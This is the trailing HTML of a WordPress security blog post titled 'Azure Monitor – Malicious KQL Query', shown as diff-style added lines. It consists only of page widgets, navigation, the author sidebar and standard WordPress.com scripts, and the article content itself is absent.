data-src="//widgets.wp.com/likes/index.html?ver=20240615#blog_id=146690742&amp;post_id=6481&amp;origin=securecloud188323504.wordpress.com&amp;obj_id=146690742-6481-666d840d75097&amp;domain=securecloud.blog" data-name="like-post-frame-146690742-6481-666d840d75097" data-title="Like or Reblog"><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Tykkää</span></span> <span class="loading">Lataa...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div></div>							</div><!-- end .entry-content -->
+
+			<footer class="entry-footer cf">
+											</footer><!-- end .entry-footer -->
+
+			
+<div id="comments" class="comments-area cf">
+  <h2 class="comments-title">
+    0 comments on “<span>Azure Monitor – Malicious KQL&nbsp;Query</span>”  </h2>
+
+<div class="comments-content cf">
+
+  
+  	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Jätä kommentti <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2022/04/27/azure-monitor-malicious-kql-query/#respond" style="display:none;">Peruuta vastaus</a></small></h3><form action="https://securecloud.blog/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate="">
+
+
+<div id="comment-form__verbum" class="transparent"></div><div class="verbum-form-meta"><input type="hidden" name="comment_post_ID" value="6481" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+
+			<input type="hidden" name="highlander_comment_nonce" id="highlander_comment_nonce" value="a5f2dae1d7">
+			<input type="hidden" name="verbum_show_subscription_modal" value=""></div><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="9eca822c5e"></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="1718453262983"><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	
+  </div><!-- end .comments-content -->
+</div><!-- end #comments .comments-area -->
+
+			
+	<nav class="navigation post-navigation" aria-label="Artikkelit">
+		<h2 class="screen-reader-text">Artikkelien selaus</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://securecloud.blog/2022/04/22/collection-aad-authentication-related-tools/" rel="prev"><span class="meta-nav">Edellinen artikkeli</span> </a></div><div class="nav-next"><a href="https://securecloud.blog/2022/05/05/cross-tenant-attacks-via-multi-tenant-implants-serviceprincipals/" rel="next"><span class="meta-nav">Seuraava artikkeli</span> </a></div></div>
+	</nav>
+		</div><!-- end #socialicons-sticky -->
+	</div><!-- end .content-wrap -->
+
+</article><!-- end post -6481 -->
+
+	
+	
+<aside id="secondary" class="sidebar widget-area" role="complementary">
+	<section id="text-5" class="widget widget_text"><h2 class="widget-title">Joosua Santasalo</h2>			<div class="textwidget"><p><strong>Security Researcher/ Azure MVP – MSRC MVR 2023 Top-100- working with <a href="https://secureworks.com">Secureworks</a></strong></p>
+<p>&nbsp;</p>
+</div>
+		</section><section id="text-7" class="widget widget_text"><h2 class="widget-title">Collaborators</h2>			<div class="textwidget"><p>Community contributors append every now and then writes also to this blog!</p>
+<p><strong>Sami Lamppu,</strong> Lead Azure Consultant</p>
+<ul>
+<li><a href="https://samilamppu.com/">https://samilamppu.com/</a></li>
+<li><a href="https://twitter.com/samilamppu">Twitter</a></li>
+</ul>
+<p>&nbsp;</p>
+<p><strong>Markus Pitkäranta,</strong> Senior Azure Consultant</p>
+<ul>
+<li><a href="https://twitter.com/PitkarantaM">Twitter</a></li>
+</ul>
+</div>
+		</section><section id="text-9" class="widget widget_text"><h2 class="widget-title">Disclaimer</h2>			<div class="textwidget"><p><em>Due to the ever evolving nature of these services the information in this weblog is provided “AS IS” with no warranties and confers no rights.</em></p>
+</div>
+		</section></aside><!-- #secondary -->
+
+</div><!-- end .singlepost-wrap -->
+
+			<div class="recommended-posts-wrap cf">
+				<div id="jp-relatedposts" class="jp-relatedposts" style="display: block;">
+	<h3 class="jp-relatedposts-headline"><em>Aiheeseen liittyy</em></h3>
+<div class="jp-relatedposts-items jp-relatedposts-items-minimal jp-relatedposts-grid "><p class="jp-relatedposts-post jp-relatedposts-post0" data-post-id="4438" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://securecloud.blog/2021/01/26/injecting-data-from-azure-functions-to-log-analytics-queries-via-azure-monitor-workbooks/" title="Injecting data from Azure Functions to Log Analytics queries via Azure Monitor&amp;nbsp;Workbooks" data-origin="6481" data-position="0">Injecting data from Azure Functions to Log Analytics queries via Azure Monitor&nbsp;Workbooks</a></span><time class="jp-relatedposts-post-date" datetime="26 tammikuun, 2021" style="display: block;">26 tammikuun, 2021</time><span class="jp-relatedposts-post-context">Kategoriassa "Azure Monitor"</span></p><p class="jp-relatedposts-post jp-relatedposts-post1" data-post-id="7001" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://securecloud.blog/2023/12/05/efficient-azure-traffic-analysis-with-kusto-mastering-ipv4-address-matching-across-multiple-logs/" title="Azure Traffic Analysis with Kusto: Harnessing the capabilities of Kusto Query Language for in-depth Azure traffic analysis of IP&amp;nbsp;addresses" data-origin="6481" data-position="1">Azure Traffic Analysis with Kusto: Harnessing the capabilities of Kusto Query Language for in-depth Azure traffic analysis of IP&nbsp;addresses</a></span><time class="jp-relatedposts-post-date" datetime="5 joulukuun, 2023" style="display: block;">5 joulukuun, 2023</time><span class="jp-relatedposts-post-context">Liked by 1 people</span></p><p class="jp-relatedposts-post jp-relatedposts-post2" data-post-id="4320" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://securecloud.blog/2021/01/11/log-analytics-normalizing-different-data-types-for-analytics/" title="Log Analytics &amp;#8211; normalizing different data types for&amp;nbsp;analytics" data-origin="6481" data-position="2">Log Analytics – normalizing different data types for&nbsp;analytics</a></span><time class="jp-relatedposts-post-date" datetime="11 tammikuun, 2021" style="display: block;">11 tammikuun, 2021</time><span class="jp-relatedposts-post-context">Kategoriassa "KQL,KUSTO"</span></p><p class="jp-relatedposts-post jp-relatedposts-post3" data-post-id="4340" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://securecloud.blog/2021/01/11/azure-active-directory-sign-ins-using-legacyauth-fork-to-include-non-interactive-logins/" title="Azure Active Directory Sign-Ins Using LegacyAuth fork to include Non-interactive&amp;nbsp;logins" data-origin="6481" data-position="3">Azure Active Directory Sign-Ins Using LegacyAuth fork to include Non-interactive&nbsp;logins</a></span><time class="jp-relatedposts-post-date" datetime="11 tammikuun, 2021" style="display: block;">11 tammikuun, 2021</time><span class="jp-relatedposts-post-context">Kategoriassa "KQL,KUSTO"</span></p></div></div>		</div><!-- end .recommended-posts-wrap -->
+	
+
+<footer id="colophon" class="site-footer cf">
+	<div class="footer-wrap">
+
+		
+	
+	<div id="site-info" class="cf">
+		<a href="https://wordpress.com/?ref=footer_blog" rel="nofollow">Pidä blogia WordPress.comissa.</a>
+		
+		Teeman Nikau on tehnyt <a href="http://www.elmastudio.de/en/" rel="designer">Elmastudio</a>.	</div><!-- end #site-info -->
+
+</div><!-- end .footer-wrap -->
+</footer><!-- end #colophon -->
+
+<!--  -->
+<script type="text/javascript" src="//0.gravatar.com/js/hovercards/hovercards.min.js?ver=2024244cee4591fae4bea45ee2571078613ea2fab8a404a7b5ceb1cf2b511ebc67fadd" id="grofiles-cards-js"></script>
+<script type="text/javascript" id="wpgroho-js-extra">
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/wp-content/mu-plugins/gravatar-hovercards/wpgroho.js?m=1610363240i"></script>
+
+	<script>
+		// Initialize and attach hovercards to all gravatars
+		( function() {
+			function init() {
+				if ( typeof Gravatar === 'undefined' ) {
+					return;
+				}
+
+				if ( typeof Gravatar.init !== 'function' ) {
+					return;
+				}
+
+				Gravatar.profile_cb = function ( hash, id ) {
+					WPGroHo.syncProfileData( hash, id );
+				};
+
+				Gravatar.my_hash = WPGroHo.my_hash;
+				Gravatar.init(
+					'body',
+					'#wp-admin-bar-my-account',
+					{
+						i18n: {
+							'Edit your profile': 'Muokkaa profiiliasi',
+							'View profile': 'View profile',
+							'Sorry, we are unable to load this Gravatar profile.': 'Sorry, we are unable to load this Gravatar profile.',
+							'Sorry, we are unable to load this Gravatar profile. Please check your internet connection.': 'Sorry, we are unable to load this Gravatar profile. Please check your internet connection.',
+							'Too Many Requests.': 'Too Many Requests.',
+							'Internal Server Error.': 'Internal Server Error.',
+						},
+					}
+				);
+			}
+
+			if ( document.readyState !== 'loading' ) {
+				init();
+			} else {
+				document.addEventListener( 'DOMContentLoaded', init );
+			}
+		} )();
+	</script>
+
+		<div style="display:none">
+	<div class="grofile-hash-map-ad5356d44ec8b765409980179616b327">
+	</div>
+	</div>
+	<div id="actionbar" class="actnbr-premium-nikau actnbr-has-follow">
+		<ul>
+								<li class="actnbr-btn actnbr-hidden">
+						<a class="actnbr-action actnbr-actn-comment" href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/#respond">
+							<svg class="gridicon gridicons-comment" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M12 16l-5 5v-5H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2h-7z"></path></g></svg>							<span>kommentti						</span>
+						</a>
+					</li>
+									<li class="actnbr-btn actnbr-hidden">
+						<a class="actnbr-action actnbr-actn-reblog" href="">
+							<svg class="gridicon gridicons-reblog" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M22.086 9.914L20 7.828V18c0 1.105-.895 2-2 2h-7v-2h7V7.828l-2.086 2.086L14.5 8.5 19 4l4.5 4.5-1.414 1.414zM6 16.172V6h7V4H6c-1.105 0-2 .895-2 2v10.172l-2.086-2.086L.5 15.5 5 20l4.5-4.5-1.414-1.414L6 16.172z"></path></g></svg><span>Bloggaa uudelleen</span>
+						</a>
+					</li>
+									<li class="actnbr-btn actnbr-hidden">
+								<a class="actnbr-action actnbr-actn-follow " href="">
+			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
+			<span>Tilaa</span>
+		</a>
+		<a class="actnbr-action actnbr-actn-following  no-display" href="">
+			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
+			<span>Tilattu</span>
+		</a>
+							<div class="actnbr-popover tip tip-top-left actnbr-notice" id="follow-bubble">
+							<div class="tip-arrow"></div>
+							<div class="tip-inner actnbr-follow-bubble">
+															<ul>
+											<li class="actnbr-sitename">
+			<a href="https://securecloud.blog">
+				<img alt="" src="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=50" srcset="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=50 1x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=75 1.5x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=100 2x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=150 3x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=191 4x" class="avatar avatar-50" height="50" width="50">				SecureCloudBlog			</a>
+		</li>
+										<div class="actnbr-message no-display"></div>
+									<form method="post" action="https://subscribe.wordpress.com" accept-charset="utf-8" style="display: none;">
+																						<div class="actnbr-follow-count">Liity 35 tilaajien joukkoon</div>
+																					<div>
+										<input type="email" name="email" placeholder="Syötä sähköpostiosoitteesi" class="actnbr-email-field" aria-label="Syötä sähköpostiosoitteesi">
+										</div>
+										<input type="hidden" name="action" value="subscribe">
+										<input type="hidden" name="blog_id" value="146690742">
+										<input type="hidden" name="source" value="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/">
+										<input type="hidden" name="sub-type" value="actionbar-follow">
+										<input type="hidden" id="_wpnonce" name="_wpnonce" value="4a916e475a">										<div class="actnbr-button-wrap">
+											<button type="submit" value="kirjaudu">
+												kirjaudu											</button>
+										</div>
+									</form>
+									<li class="actnbr-login-nudge">
+										<div>
+											Already have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fsecurecloud.blog%252F2022%252F04%252F27%252Fazure-monitor-malicious-kql-query%252F">Log in now.</a>										</div>
+									</li>
+								</ul>
+															</div>
+						</div>
+					</li>
+									<li class="actnbr-btn actnbr-hidden no-display" onclick="javascript:__tcfapi( 'showUi' );">
+						<a class="actnbr-action actnbr-actn-privacy" href="#">
+							<svg class="gridicon gridicons-info-outline" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M13 9h-2V7h2v2zm0 2h-2v6h2v-6zm-1-7c-4.41 0-8 3.59-8 8s3.59 8 8 8 8-3.59 8-8-3.59-8-8-8m0-2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2z"></path></g></svg>							<span>Tietosuoja						</span>
+						</a>
+					</li>
+							<li class="actnbr-ellipsis actnbr-hidden">
+				<svg class="gridicon gridicons-ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M7 12c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2zm12-2c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm-7 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2z"></path></g></svg>				<div class="actnbr-popover tip tip-top-left actnbr-more">
+					<div class="tip-arrow"></div>
+					<div class="tip-inner">
+						<ul>
+									<li class="actnbr-sitename">
+			<a href="https://securecloud.blog">
+				<img alt="" src="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=50" srcset="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=50 1x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=75 1.5x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=100 2x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=150 3x, https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=191 4x" class="avatar avatar-50" height="50" width="50">				SecureCloudBlog			</a>
+		</li>
+								<li class="actnbr-folded-customize">
+								<a href="https://securecloud188323504.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Fsecurecloud188323504.wordpress.com%2F2022%2F04%2F27%2Fazure-monitor-malicious-kql-query%2F">
+									<svg class="gridicon gridicons-customize" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z"></path></g></svg>									<span>Mukauta</span>
+								</a>
+							</li>
+																<li class="actnbr-folded-follow">
+												<a class="actnbr-action actnbr-actn-follow " href="">
+			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
+			<span>Tilaa</span>
+		</a>
+		<a class="actnbr-action actnbr-actn-following  no-display" href="">
+			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
+			<span>Tilattu</span>
+		</a>
+										</li>
+																	<li class="actnbr-signup"><a href="https://wordpress.com/start/">Kirjaudu</a></li>
+									<li class="actnbr-login"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fsecurecloud.blog%252F2022%252F04%252F27%252Fazure-monitor-malicious-kql-query%252F">Kirjaudu sisään</a></li>
+																	<li class="actnbr-shortlink"><a href="https://wp.me/p9VuXI-1Gx">Kopioi lyhytlinkki</a></li>
+																	<li class="flb-report">
+										<a href="https://wordpress.com/abuse/?report_url=https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/" target="_blank" rel="noopener noreferrer">
+											Ilmoita sisällöstä										</a>
+									</li>
+																	<li class="actnbr-reader">
+										<a href="https://wordpress.com/read/blogs/146690742/posts/6481">
+											View post in Reader										</a>
+									</li>
+																	<li class="actnbr-subs">
+										<a href="https://subscribe.wordpress.com/">Hallitse tilauksia</a>
+									</li>
+																		<li class="actnbr-fold"><a href="">Pienennä tämä palkki</a></li>
+															</ul>
+					</div>
+				</div>
+			</li>
+		</ul>
+	</div>
+	
+<script>
+window.addEventListener( "load", function( event ) {
+	var link = document.createElement( "link" );
+	link.href = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.css?v=20240115";
+	link.type = "text/css";
+	link.rel = "stylesheet";
+	document.head.appendChild( link );
+
+	var script = document.createElement( "script" );
+	script.src = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.js?v=20231122";
+	script.defer = true;
+	document.body.appendChild( script );
+} );
+</script>
+
+			<div id="jp-carousel-loading-overlay">
+			<div id="jp-carousel-loading-wrapper">
+				<span id="jp-carousel-library-loading">&nbsp;</span>
+			</div>
+		</div>
+		<div class="jp-carousel-overlay" style="display: none;">
+
+		<div class="jp-carousel-container">
+			<!-- The Carousel Swiper -->
+			<div class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
+				<div class="jp-carousel swiper-wrapper"></div>
+				<div class="jp-swiper-button-prev swiper-button-prev">
+					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
+							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
+						</mask>
+						<g mask="url(#maskPrev)">
+							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
+						</g>
+					</svg>
+				</div>
+				<div class="jp-swiper-button-next swiper-button-next">
+					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
+							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
+						</mask>
+						<g mask="url(#maskNext)">
+							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
+						</g>
+					</svg>
+				</div>
+			</div>
+			<!-- The main close buton -->
+			<div class="jp-carousel-close-hint">
+				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
+						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
+					</mask>
+					<g mask="url(#maskClose)">
+						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
+					</g>
+				</svg>
+			</div>
+			<!-- Image info, comments and meta -->
+			<div class="jp-carousel-info">
+				<div class="jp-carousel-info-footer">
+					<div class="jp-carousel-pagination-container">
+						<div class="jp-swiper-pagination swiper-pagination"></div>
+						<div class="jp-carousel-pagination"></div>
+					</div>
+					<div class="jp-carousel-photo-title-container">
+						<h2 class="jp-carousel-photo-caption"></h2>
+					</div>
+					<div class="jp-carousel-photo-icons-container">
+						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
+							<span class="jp-carousel-icon">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
+									</mask>
+									<g mask="url(#maskInfo)">
+										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+							</span>
+						</a>
+												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
+							<span class="jp-carousel-icon">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
+									</mask>
+									<g mask="url(#maskComments)">
+										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+
+								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
+							</span>
+						</a>
+											</div>
+				</div>
+				<div class="jp-carousel-info-extra">
+					<div class="jp-carousel-info-content-wrapper">
+						<div class="jp-carousel-photo-title-container">
+							<h2 class="jp-carousel-photo-title"></h2>
+						</div>
+						<div class="jp-carousel-comments-wrapper">
+															<div id="jp-carousel-comments-loading">
+									<span>Ladataan kommentteja...</span>
+								</div>
+								<div class="jp-carousel-comments"></div>
+								<div id="jp-carousel-comment-form-container">
+									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
+									<div id="jp-carousel-comment-post-results"></div>
+																														<form id="jp-carousel-comment-form">
+												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Kirjoita kommentti...</label>
+												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Kirjoita kommentti..."></textarea>
+												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
+													<div id="jp-carousel-comment-form-commenting-as">
+																													<fieldset>
+																<label for="jp-carousel-comment-form-email-field">Sähköpostiosoite (Vaaditaan)</label>
+																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
+															</fieldset>
+															<fieldset>
+																<label for="jp-carousel-comment-form-author-field">Nimi (Vaaditaan)</label>
+																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
+															</fieldset>
+															<fieldset>
+																<label for="jp-carousel-comment-form-url-field">Kotisivu</label>
+																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
+															</fieldset>
+																											</div>
+													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Lähetä kommentti">
+												</div>
+											</form>
+																											</div>
+													</div>
+						<div class="jp-carousel-image-meta">
+							<div class="jp-carousel-title-and-caption">
+								<div class="jp-carousel-photo-info">
+									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
+								</div>
+
+								<div class="jp-carousel-photo-description"></div>
+							</div>
+							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
+							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
+									</mask>
+									<g mask="url(#mask0)">
+										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+								<span class="jp-carousel-download-text"></span>
+							</a>
+							<div class="jp-carousel-image-map" style="display: none;"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		</div>
+		
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/securecloud.blog\/2022\/04\/27\/azure-monitor-malicious-kql-query\/":6481};
+	</script>
+				<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKioFEonFGdQ0zysYzKemkcGFOUDj7HNtDU3NDYwMTCwtTLMA7zd/ww=="></script>
+<script type="text/javascript">
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.head.appendChild( corecss );
+		var themecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414i&amp;ver=3.0.9b";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		document.head.appendChild( themecss );
+	})();
